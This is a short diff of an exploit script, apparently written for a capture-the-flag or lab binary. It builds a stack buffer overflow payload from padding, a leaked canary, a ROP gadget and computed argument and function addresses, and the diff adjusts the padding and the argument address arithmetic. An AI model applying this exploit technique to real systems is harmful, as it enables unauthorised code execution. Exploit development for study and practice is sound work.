@@ -75,7 +75,7 @@ try:
 # exploit will consist of argstr + overflow + canary + gadget + argaddr + funcaddr
 
     argstr = b"pawned!"
-    overflow1 = b"A" * (24 - len(argstr)) # check numbers on this
+    overflow1 = b"\x00" + b"A" * (23 - len(argstr)) # check numbers on this
     # canary_byte_array defined on first request
     # sbase_byte_array defined on second request
     overflow2 = b"A" * 8 # check numbers on this
@@ -86,7 +86,7 @@ try:
     
 
     print("hex of 2b8: " + hex(0x2b8))
-    argaddr = bytearray.fromhex(hex(int(stack_base, 16) +  int("0x2c0", 16))[2:])
+    argaddr = bytearray.fromhex(hex(int(stack_base, 16) -  int("0x2c0", 16))[2:])
     argaddr.reverse()
     
     funcaddr = hex(int(binary_base, 16) + 0xaea)
